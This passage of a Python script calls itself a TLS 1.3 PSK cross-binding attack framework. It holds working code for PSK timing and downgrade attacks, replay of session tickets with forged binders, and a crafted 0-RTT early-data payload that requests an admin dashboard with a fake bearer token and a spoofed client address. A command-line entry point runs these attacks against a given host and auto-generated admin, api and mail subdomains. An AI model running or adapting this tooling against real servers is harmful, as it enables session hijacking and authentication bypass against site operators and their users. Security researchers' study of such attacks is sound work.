                    'ticket_structure': self._analyze_ticket_structure(tickets[0]),
                    'timing_patterns': await self._measure_psk_timing(sni),
                    'error_patterns': await self._analyze_psk_errors(sni)
                }
                results['fingerprints'][sni] = fingerprint
        
        return results
    
    async def _test_psk_timing_attacks(self, sni_list: List[str]) -> Dict[str, Any]:
        """Test timing-based PSK attacks"""
        results = {'timing_data': {}, 'vulnerabilities': []}
        
        for sni in sni_list:
            timing_data = await self._perform_timing_analysis(sni)
            results['timing_data'][sni] = timing_data
            
            if timing_data['variance'] > 100:  # High timing variance
                results['vulnerabilities'].append({
                    'type': 'PSK Timing Information Leak',
                    'severity': 'MEDIUM',
                    'sni': sni,
                    'evidence': f'High timing variance: {timing_data["variance"]:.2f}ms'
                })
        
        return results
    
    async def _test_psk_downgrade_attacks(self, sni_list: List[str]) -> Dict[str, Any]:
        """Test PSK downgrade attacks"""
        results = {'downgrade_tests': {}, 'vulnerabilities': []}
        
        for sni in sni_list:
            # Test if PSK can be downgraded to weaker modes
            downgrade_result = await self._test_psk_mode_downgrade(sni)
            results['downgrade_tests'][sni] = downgrade_result
            
            if downgrade_result.get('downgrade_successful'):
                results['vulnerabilities'].append({
                    'type': 'PSK Mode Downgrade',
                    'severity': 'HIGH',
                    'sni': sni,
                    'evidence': 'PSK downgraded to weaker key exchange mode'
                })
        
        return results
    
    async def _send_tls_handshake(self, handshake_data: bytes, sni: str) -> bytes:
        """Send TLS handshake and receive response"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            sock.connect((self.target_host, self.target_port))
            sock.send(handshake_data)
            response = sock.recv(8192)
            return response
        finally:
            sock.close()
    
    def _derive_binder_key(self, ticket: SessionTicket) -> bytes:
        """Derive PSK binder key (simplified implementation)"""
        # In real implementation, this would use proper TLS 1.3 key derivation
        if ticket.master_secret:
            return HKDF.expand_label(ticket.master_secret, "res binder", b"", 32)
        else:
            # Fallback to ticket-based key
            return hashlib.sha256(ticket.ticket + b"binder_key").digest()
    
    def _create_malicious_early_data(self, target_sni: str) -> bytes:
        """Create malicious early data payload"""
        payload = f"GET /admin/dashboard HTTP/1.1\r\n"
        payload += f"Host: {target_sni}\r\n"
        payload += "Authorization: Bearer admin_token_123\r\n"
        payload += "X-Early-Data-Attack: true\r\n"
        payload += "X-Forwarded-For: 127.0.0.1\r\n"
        payload += "\r\n"
        return payload.encode()
    
    def _analyze_psk_response(self, response: bytes) -> bool:
        """Analyze TLS response for PSK acceptance"""
        if not response or len(response) < 5:
            return False
        
        # Check for ServerHello (simplified)
        try:
            if response[0] == TLSContentType.HANDSHAKE and len(response) >= 9:
                # Extract handshake type
                handshake_type = response[5]
                return handshake_type == TLSHandshakeType.SERVER_HELLO
        except:
            pass
        
        return False
    
    def _check_early_data_acceptance(self, response: bytes) -> bool:
        """Check if early data was accepted"""
        # Look for early data acceptance indicators
        return b"early_data" in response.lower() or b"0rtt" in response.lower()
    
    def _analyze_ticket_structure(self, ticket: SessionTicket) -> Dict[str, Any]:
        """Analyze PSK ticket structure for fingerprinting"""
        return {
            'length': len(ticket.ticket),
            'entropy': len(set(ticket.ticket)) / 256.0,  # Rough entropy measure
            'structure_hash': hashlib.sha256(ticket.ticket[:32]).hexdigest()[:16]
        }
    
    async def _measure_psk_timing(self, sni: str) -> Dict[str, float]:
        """Measure PSK handshake timing"""
        tickets = self.psk_cache.get(sni, [])
        if not tickets:
            return {'average': 0, 'variance': 0, 'error': 'no_tickets'}
            
        timings_with_psk = []
        timings_without_psk = []
        
        try:
            ticket = tickets[0]
            
            # Test 1: PSK handshake timing
            for _ in range(5):
                start = time.perf_counter()
                try:
                    psk_identity = PSKIdentity(
                        identity=ticket.ticket,
                        obfuscated_ticket_age=ticket.calculate_obfuscated_age()
                    )
                    binder_key = self._derive_binder_key(ticket)
                    binder_value = hmac.new(binder_key, b"timing_test", hashlib.sha256).digest()
                    psk_binder = PSKBinder(binder_value[:32])
                    
                    client_hello = TLS13MessageBuilder.build_client_hello(sni, [psk_identity], [psk_binder])
                    record = TLSRecord(
                        content_type=TLSContentType.HANDSHAKE,
                        version=TLSVersion.TLS_1_2,
                        length=len(client_hello),
                        fragment=client_hello
                    )
                    
                    response = await self._send_tls_handshake(bytes(record), sni)
                    timing = (time.perf_counter() - start) * 1000
                    timings_with_psk.append(timing)
                except:
                    pass
            
            # Test 2: Normal handshake timing (no PSK)
            for _ in range(5):
                start = time.perf_counter()
                try:
                    client_hello = TLS13MessageBuilder.build_client_hello(sni)  # No PSK
                    record = TLSRecord(
                        content_type=TLSContentType.HANDSHAKE,
                        version=TLSVersion.TLS_1_2,
                        length=len(client_hello),
                        fragment=client_hello
                    )
                    
                    response = await self._send_tls_handshake(bytes(record), sni)
                    timing = (time.perf_counter() - start) * 1000
                    timings_without_psk.append(timing)
                except:
                    pass
            
            # Calculate timing differences
            if timings_with_psk and timings_without_psk:
                avg_psk = sum(timings_with_psk) / len(timings_with_psk)
                avg_normal = sum(timings_without_psk) / len(timings_without_psk)
                variance_psk = sum((t - avg_psk) ** 2 for t in timings_with_psk) / len(timings_with_psk)
                
                return {
                    'average': avg_psk,
                    'variance': variance_psk,
                    'psk_timing': avg_psk,
                    'normal_timing': avg_normal,
                    'timing_difference': abs(avg_psk - avg_normal),
                    'psk_faster': avg_psk < avg_normal
                }
        except Exception as e:
            return {'average': 0, 'variance': 0, 'error': str(e)}
        
        return {'average': 0, 'variance': 0, 'error': 'insufficient_measurements'}
    
    async def _analyze_psk_errors(self, sni: str) -> Dict[str, Any]:
        """Analyze PSK error response patterns"""
        error_patterns = []
        
        try:
            # Test invalid PSK to analyze error responses
            invalid_psk = PSKIdentity(identity=b"invalid_ticket_data", obfuscated_ticket_age=0)
            fake_binder = PSKBinder(b"fake_binder_32_bytes_exactly_len")
            
            client_hello = TLS13MessageBuilder.build_client_hello(sni, [invalid_psk], [fake_binder])
            record = TLSRecord(
                content_type=TLSContentType.HANDSHAKE,
                version=TLSVersion.TLS_1_2,
                length=len(client_hello),
                fragment=client_hello
            )
            
            response = await self._send_tls_handshake(bytes(record), sni)
            
            # Analyze error response
            if response and len(response) >= 5:
                if response[0] == TLSContentType.ALERT:
                    alert_level = response[5] if len(response) > 5 else 0
                    alert_desc = response[6] if len(response) > 6 else 0
                    error_patterns.append(f"Alert: level={alert_level}, desc={alert_desc}")
                elif response[0] == TLSContentType.HANDSHAKE:
                    error_patterns.append("Server continued handshake with invalid PSK")
                    
        except Exception as e:
            error_patterns.append(f"Connection error: {str(e)[:50]}")
            
        return {
            'error_types': error_patterns,
            'patterns': {'invalid_psk_handling': len(error_patterns) > 0}
        }
    
    async def _perform_timing_analysis(self, sni: str) -> Dict[str, Any]:
        """Perform comprehensive timing analysis"""
        return await self._measure_psk_timing(sni)
    
    async def _test_psk_mode_downgrade(self, sni: str) -> Dict[str, Any]:
        """Test PSK mode downgrade vulnerability"""
        tickets = self.psk_cache.get(sni, [])
        if not tickets:
            return {'downgrade_successful': False, 'reason': 'no_tickets'}
            
        try:
            ticket = tickets[0]
            
            # Test 1: Try to force PSK_KE mode (without DHE)
            psk_identity = PSKIdentity(
                identity=ticket.ticket,
                obfuscated_ticket_age=ticket.calculate_obfuscated_age()
            )
            
            # Build ClientHello with PSK_KE mode only (weaker)
            client_hello_start = struct.pack('>H', TLSVersion.TLS_1_2)  # Legacy version
            client_hello_start += secrets.token_bytes(32)  # Random
            client_hello_start += struct.pack('>B', 0)  # Empty session ID
            
            # Cipher suites
            cipher_suites = struct.pack('>HH', 2, TLSCipherSuite.TLS_AES_128_GCM_SHA256)
            client_hello_start += cipher_suites
            client_hello_start += struct.pack('>BB', 1, 0)  # Compression
            
            # Extensions with only PSK_KE mode (no DHE)
            extensions = b''
            
            # SNI
            sni_data = TLS13MessageBuilder._build_sni_extension(sni)
            extensions += struct.pack('>HH', TLSExtensionType.SERVER_NAME, len(sni_data)) + sni_data
            
            # Supported versions
            versions = struct.pack('>BH', 2, TLSVersion.TLS_1_3)
            extensions += struct.pack('>HH', TLSExtensionType.SUPPORTED_VERSIONS, len(versions)) + versions
            
            # PSK modes - force PSK_KE (weaker mode)
            psk_modes = struct.pack('>BB', 1, PSKKeyExchangeMode.PSK_KE)  # No DHE
            extensions += struct.pack('>HH', TLSExtensionType.PSK_KEY_EXCHANGE_MODES, len(psk_modes)) + psk_modes
            
            # PSK extension
            binder_key = self._derive_binder_key(ticket)
            binder_value = hmac.new(binder_key, b"downgrade_test", hashlib.sha256).digest()
            psk_binder = PSKBinder(binder_value[:32])
            psk_data = TLS13MessageBuilder._build_psk_extension([psk_identity], [psk_binder])
            extensions += struct.pack('>HH', TLSExtensionType.PRE_SHARED_KEY, len(psk_data)) + psk_data
            
            # Complete ClientHello
            client_hello = client_hello_start + struct.pack('>H', len(extensions)) + extensions
            handshake_msg = struct.pack('>BI', TLSHandshakeType.CLIENT_HELLO, len(client_hello)) + client_hello
            
            record = TLSRecord(
                content_type=TLSContentType.HANDSHAKE,
                version=TLSVersion.TLS_1_2,
                length=len(handshake_msg),
                fragment=handshake_msg
            )
            
            response = await self._send_tls_handshake(bytes(record), sni)
            
            # Check if server accepted weaker PSK_KE mode
            if self._analyze_psk_response(response):
                return {
                    'downgrade_successful': True,
                    'mode_downgraded_to': 'PSK_KE',
                    'evidence': 'Server accepted PSK without DHE key exchange'
                }
                
        except Exception as e:
            return {'downgrade_successful': False, 'error': str(e)}
            
        return {'downgrade_successful': False, 'reason': 'server_rejected_downgrade'}
    
    def compile_attack_statistics(self) -> Dict[str, Any]:
        """Compile comprehensive attack statistics"""
        stats = self.attack_stats.copy()
        stats['success_rates'] = {
            'overall': stats['successful_binds'] / max(stats['total_attempts'], 1),
            'cross_sni': stats['cross_sni_success'] / max(len(self.psk_cache), 1),
            'zero_rtt': stats['zero_rtt_success'] / max(stats['total_attempts'], 1),
            'replay': stats['replay_success'] / max(stats['total_attempts'], 1)
        }
        return stats
    
    def _analyze_vulnerabilities(self, results: Dict[str, Any]):
        """Analyze and categorize discovered vulnerabilities"""
        all_vulnerabilities = []
        
        # Collect vulnerabilities from all attack phases
        for attack_type, attack_results in results['attacks'].items():
            if isinstance(attack_results, dict) and 'vulnerabilities' in attack_results:
                all_vulnerabilities.extend(attack_results['vulnerabilities'])
        
        # Categorize by severity
        results['vulnerabilities'] = all_vulnerabilities
        results['vulnerability_summary'] = {
            'total': len(all_vulnerabilities),
            'critical': len([v for v in all_vulnerabilities if v.get('severity') == 'CRITICAL']),
            'high': len([v for v in all_vulnerabilities if v.get('severity') == 'HIGH']),
            'medium': len([v for v in all_vulnerabilities if v.get('severity') == 'MEDIUM']),
            'low': len([v for v in all_vulnerabilities if v.get('severity') == 'LOW'])
        }
        
        # Overall risk assessment
        if results['vulnerability_summary']['critical'] > 0:
            results['risk_level'] = 'CRITICAL'
        elif results['vulnerability_summary']['high'] > 0:
            results['risk_level'] = 'HIGH'
        elif results['vulnerability_summary']['medium'] > 0:
            results['risk_level'] = 'MEDIUM'
        else:
            results['risk_level'] = 'LOW'

# Utility Functions
def format_results_json(results: Dict[str, Any]) -> str:
    """Format results as JSON"""
    return json.dumps(results, indent=2, default=str)

def format_results_report(results: Dict[str, Any]) -> str:
    """Format results as human-readable report"""
    report = []
    report.append("="*80)
    report.append("TLS 1.3 PSK CROSS-BINDING VULNERABILITY ASSESSMENT")
    report.append("="*80)
    
    report.append(f"\nTarget: {results.get('target')}")
    report.append(f"Assessment Time: {results.get('timestamp')}")
    report.append(f"Duration: {results.get('metadata', {}).get('assessment_duration', 0):.2f}s")
    report.append(f"SNIs Tested: {', '.join(results.get('sni_list', []))}")
    
    # Summary
    vuln_summary = results.get('vulnerability_summary', {})
    report.append(f"\n VULNERABILITY SUMMARY:")
    report.append(f"   Total Vulnerabilities: {vuln_summary.get('total', 0)}")
    report.append(f"   Critical: {vuln_summary.get('critical', 0)}")
    report.append(f"   High: {vuln_summary.get('high', 0)}")
    report.append(f"   Medium: {vuln_summary.get('medium', 0)}")
    report.append(f"   Risk Level: {results.get('risk_level', 'UNKNOWN')}")
    
    # Detailed vulnerabilities
    if results.get('vulnerabilities'):
        report.append(f"\n DETAILED VULNERABILITIES:")
        for i, vuln in enumerate(results['vulnerabilities'], 1):
            report.append(f"\n   {i}. [{vuln['severity']}] {vuln['type']}")
            report.append(f"      Evidence: {vuln['evidence']}")
            report.append(f"      Impact: {vuln['impact']}")
            if 'source_sni' in vuln and 'target_sni' in vuln:
                report.append(f"      Cross-Binding: {vuln['source_sni']} → {vuln['target_sni']}")
    
    # Statistics
    stats = results.get('statistics', {})
    if stats:
        report.append(f"\n ATTACK STATISTICS:")
        report.append(f"   Total Attempts: {stats.get('total_attempts', 0)}")
        report.append(f"   Successful Binds: {stats.get('successful_binds', 0)}")
        report.append(f"   Cross-SNI Success: {stats.get('cross_sni_success', 0)}")
        report.append(f"   0-RTT Success: {stats.get('zero_rtt_success', 0)}")
    
    return '\n'.join(report)

async def main():
    """Enhanced main function with comprehensive CLI"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Advanced TLS 1.3 PSK Cross-Binding Attack Framework v3.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s example.com
  %(prog)s api.example.com --port 8443 --timeout 15
  %(prog)s target.com --sni-list www.target.com api.target.com admin.target.com
  %(prog)s internal.service --output assessment.json --format json
        """
    )
    
    parser.add_argument('host', help='Target hostname or IP address')
    parser.add_argument('--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('--sni-list', nargs='+', help='List of SNIs to test')
    parser.add_argument('--timeout', type=float, default=10.0, help='Connection timeout (default: 10.0)')
    parser.add_argument('--max-retries', type=int, default=3, help='Maximum retry attempts (default: 3)')
    parser.add_argument('--output', '-o', help='Output file path')
    parser.add_argument('--format', choices=['json', 'report'], default='report', help='Output format (default: report)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    
    # Generate default SNI list if not provided
    if not args.sni_list:
        base_domain = args.host
        if '.' in base_domain:
            parts = base_domain.split('.')
            root_domain = '.'.join(parts[-2:]) if len(parts) > 2 else base_domain
        else:
            root_domain = base_domain
            
        args.sni_list = [
            args.host,
            f"www.{root_domain}",
            f"api.{root_domain}",
            f"admin.{root_domain}",
            f"secure.{root_domain}",
            f"portal.{root_domain}",
            f"mail.{root_domain}"
        ]
    
    print(f" TLS 1.3 PSK Cross-Binding Attack Framework v3.0")
    print(f" Target: {args.host}:{args.port}")
    print(f" Testing SNIs: {', '.join(args.sni_list)}")
    print(f"️  Configuration: timeout={args.timeout}s, retries={args.max_retries}")
    print()
    
    # Create attack framework
    attacker = TLS13PSKCrossBind(
        target_host=args.host,
        target_port=args.port,
        timeout=args.timeout,
        max_retries=args.max_retries
    )
    
    try:
        # Run comprehensive assessment
        results = await attacker.run_comprehensive_assessment(args.sni_list)
        
        # Format output
        if args.format == 'json':
            output = format_results_json(results)
        else:
            output = format_results_report(results)
        
        # Write to file or stdout
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(output)
            print(f" Assessment results written to: {args.output}")
        else:
            print(output)
        
        # Exit with appropriate code based on risk level
        risk_to_exit_code = {
            'CRITICAL': 4,
            'HIGH': 3,
            'MEDIUM': 2,
            'LOW': 1,
            'NONE': 0
        }
        
        exit_code = risk_to_exit_code.get(results.get('risk_level', 'NONE'), 0)
        return exit_code
        
    except KeyboardInterrupt:
        print("\n️  Assessment interrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Assessment failed: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    import sys
    exit_code = asyncio.run(main())
    sys.exit(exit_code)
